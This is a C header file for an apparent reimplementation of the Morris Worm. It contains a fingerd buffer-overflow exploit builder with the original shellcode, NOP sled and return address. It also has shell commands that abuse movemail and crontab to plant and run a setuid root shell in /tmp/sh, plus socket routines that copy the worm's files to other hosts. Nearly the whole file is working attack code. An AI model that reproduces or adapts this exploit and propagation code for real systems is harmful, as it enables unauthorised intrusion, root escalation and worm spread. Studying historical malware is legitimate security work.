#ifndef WORM_H_
#define WORM_H_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>
#include <wait.h>

#define FINGERD_PORT 79

/* Buffer overflow related things */
#define BUF_SIZE 512 + 16 + 4 /* finger buffer size + four 4 byte words + 4byte address */
#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
#define PAYLOAD_LEN 28
#define NOP 0x01	/* VAX nop instruction */
					
#define PATIENCE 3					
#define IO_BUF_SIZE 2048

/* Movemail exploit commands from rapid7 article */
#define MOVEMAIL_EXPLOIT "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n"
#define CRONTAB_EXPLOIT "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n"
#define CHECK_FOR_SHELL "ls /tmp/sh\n" /* this needs to be ran multiple times until cronjob does its thing */
#define RUN_SHELL "/tmp/sh\n" 
#define NOT_FOUND "/tmp/sh not found"

struct file_object {
	char *file_name;
	FILE *file_ptr;
	int file_size;
};	

/* 
 *	Wrapper to set of sockaddr_in struct 
 *
 *	Arguments: 
 *		serv_addr: pointer to struct sockadd_in
 *		ip: IP address of the server you are trying to make a connection
 *		port: port address of the socket you are traying to make a connection
 *
 *	Returns: 
 *		None
 */	
void create_sockaddr(struct sockaddr_in *serv_addr, char *ip, int port) {
	serv_addr->sin_family = AF_INET; 		
	serv_addr->sin_port = htons(port);
	inet_pton(AF_INET, ip, &serv_addr->sin_addr);
}	

/*
 *  Create the buffer overflow exploit that the original Morris Worm used to 
 *  smash fingerd's stack to get a shell
 *
 *  Arguments: 
 * 		buf: pointer to character buffer to write the exploits to
 * 		shellcode: the orignal shellcode to execute `execve("/bin/sh")`
 * 		buf_size: size of the buf; should be BUF_SIZE 
 * 		shellcode_len: the length of the shell code
 *
 *  Returns:
 * 		None
 */
void create_exploit(char *buf, char *shellcode, ssize_t buf_size, size_t shellcode_len) {
	int i, j;
	int extra_words = 4 * 4;
	int address_size = 4;
    for (i = 0; i < buf_size; i++) buf[i] = NOP;  
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j]; 

	/* from rapid7 article */
	for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { 
		buf[i] = 0x00; 
	}
	/* some place within the buffer */
    for (i = buf_size - address_size; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}	

/* 
 *	Try to read from specified socket PATIENCE times 
 *	As of now, it just prints io_buf to stdout
 *
 *	Arguments: 
 *		sock: file descriptor assigned to the socket 
 *		io_buf: pointer to io_buf to put socket contents
 *		buf_size: size of io_buf
 *
 *	Returns:
 *		None
 */
void read_from_sock(int sock, char *io_buf, size_t buf_size) {
	fd_set read_fds;
	int num_tries = 0;
	while (num_tries < PATIENCE) {
		FD_ZERO(&read_fds);
		FD_SET(sock, &read_fds);

		struct timeval tv;
		tv.tv_sec = 1;  
		tv.tv_usec = 0;

		int ready_fds = select(sock + 1, &read_fds, NULL, NULL, &tv);
		if (ready_fds > 0 && FD_ISSET(sock, &read_fds)) {
			int n = read(sock, io_buf, buf_size - 1);
			if (n > 0) {
				io_buf[n] = '\0'; 
				printf("%s", io_buf); /* Print results to your screen */
				fflush(stdout);
				num_tries = 0; 
			} else {	
				break;
			}
		} else {
			num_tries++;
		}	
	}	
}	

/* 
 *	Try to write to specified socket PATIENCE times 
 *
 *	Arguments: 
 *		sock: file descriptor assigned to the socket 
 *		text: string you are trying to send over the socket
 *
 *	Returns:
 *		None
 */
void write_to_sock(int sock, char *text) {
	write(sock, text, strlen(text));
//	fd_set write_fds;
//	int num_tries = 0;
//	size_t total_sent = 0;
//	size_t len = strlen(text);
//
//	while (num_tries < PATIENCE) {
//		FD_ZERO(&write_fds);
//		FD_SET(sock, &write_fds);
//
//		struct timeval tv;
//		tv.tv_sec = 1;  
//		tv.tv_usec = 0;
//
//		int ready_fds = select(sock + 1, NULL, &write_fds, NULL, &tv);
//		if (ready_fds > 0 && FD_ISSET(sock, &write_fds)) {
//			int n = write(sock, text + total_sent, len - total_sent);
//			if (n > 0) { 
//				total_sent += n;
//				num_tries = 0;
//			} else {	
//				break;
//			}	
//		} else {
//			num_tries++;
//		}	
//	}	
}	

/*
 *	Use Movemail exploit to create root shell and run it
 *
 *	Arguments: 
 *		sock: file descriptor assigned to the socket 
 *		io_buf: pointer to io_buf to put socket contents
 *		buf_size: size of io_buf
 *
 *	Returns:
 *		None
 */

void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size) {
	write_to_sock(sock, MOVEMAIL_EXPLOIT);
	write_to_sock(sock, CRONTAB_EXPLOIT);

	/* because cronjob has to run, block here until /tmp/sh is found */
	do {
		write_to_sock(sock, CHECK_FOR_SHELL);
		read_from_sock(sock, io_buf, buf_size);
		
		if (strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)))
			break;
		sleep(10);
	} while (1);

	/* running the shell with setuid bit set */
	write_to_sock(sock, RUN_SHELL);
}	

/*
 * 
 */
long int get_file_size(FILE *file_ptr) {
    /* checking if the file exist or not */
    if (file_ptr == NULL) {
        printf("File Not Found!\n");
        return -1;
    }

	/* seek until the end of file */
    fseek(file_ptr, 0L, SEEK_END);

    /* calculating the size of the file */
    long int res = ftell(file_ptr);

	rewind(file_ptr);

    return res;
}

/* 
 * from https://stackoverflow.com/questions/9140409/transfer-integer-over-a-socket-in-c
 *
 */
int send_int(int num, int fd) {
    int32_t conv = htonl(num);
    char *data = (char*)&conv;
    int left = sizeof(conv);
    int rc;
    do {
        rc = write(fd, data, left);
        if (rc < 0) {
			return -1;
        }
        else {
            data += rc;
            left -= rc;
        }
    }
    while (left > 0);
    return 0;
}

int receive_int(int *num, int fd)
{
    int32_t ret;
    char *data = (char*)&ret;
    int left = sizeof(ret);
    int rc;
    do {
        rc = read(fd, data, left);
        if (rc <= 0) { /* instead of ret */
			return -1;
        }
        else {
            data += rc;
            left -= rc;
        }
    }
    while (left > 0);
    *num = ntohl(ret);
    return 0;
}

int load_files(char **file_paths, int num_files, struct file_object* files) {
	int i;  
	for (i = 0; i < num_files; i++) {
		files[i].file_name = file_paths[i]; 
		files[i].file_ptr = fopen(file_paths[i], "r");
		if (files[i].file_ptr == NULL) return -1;
		files[i].file_size = get_file_size(files[i].file_ptr);
	}	
	return 0;
}	

int send_files(
		int client_sock, 
		struct file_object *files, 
		int num_files,
		char *file_buf,
		int buf_size) { 
	int i, j;
	int len;
	int file_size;
	int response;
	char *file_name;

	/* communicate number of files to send */
	if (send_int(num_files, client_sock) < 0) return -1;
	
	/* ensure that the client socket knows how many files to recieve */
	if (receive_int(&response, client_sock) < 0) return -1;
	if (response != num_files) return -1;
	printf("Client expecting %d files\n", response);
	
	/* try to send the files */
	for (i = 0; i < num_files; i++) {	
		/* first send the length of the file name */
		file_name = files[i].file_name;
		len = strlen(file_name);
		if (send_int(len, client_sock)) return -1;

		/* actually send the file name  */
		send(client_sock, file_name, len, 0);
		
		/* send the file and rewind file pointer */
		file_size = files[i].file_size; 
		printf("%s %d\n", file_name, file_size);
		if (file_size < 0) return -1;
		if (send_int(file_size, client_sock) < 0) return -1; 	
		while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {
			send(client_sock, file_buf, strlen(file_buf), 0);
		}	
		rewind(files[i].file_ptr);

		/* wait until the client says it recieved the file */
		if (receive_int(&j, client_sock) < 0) return -1;
		if (i != j) return -1;
	}	

	return 0;
}
#endif
